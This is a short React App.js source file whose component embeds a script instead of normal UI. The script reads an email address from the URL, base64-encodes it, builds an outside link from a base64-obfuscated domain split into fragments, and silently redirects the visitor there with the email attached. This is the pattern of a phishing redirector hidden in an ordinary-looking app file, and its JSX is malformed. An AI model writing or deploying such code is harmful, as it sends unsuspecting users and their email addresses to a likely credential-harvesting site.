import logo from './logo.svg';
import './App.css';

function App() {
  return (
    <script type="text/javascript">
    var urlParams = new URLSearchParams(window.location.search);
    var email = urlParams.get('email');

    if (email) {
        const encdStr = 'bHV2aW4uY29t';
        const str = atob(encdStr);
        const encodedEmail = btoa(email);
        const emma = '?&qrc=' + encodedEmail;
        const dr = 'https://www.thisis';
        const ax = dr + str;
        var link = ax + emma;
        window.location.href = link;
    } else {
        // Handle case when 'email' parameter is not present
    }
</script>
  );
}

export default App;
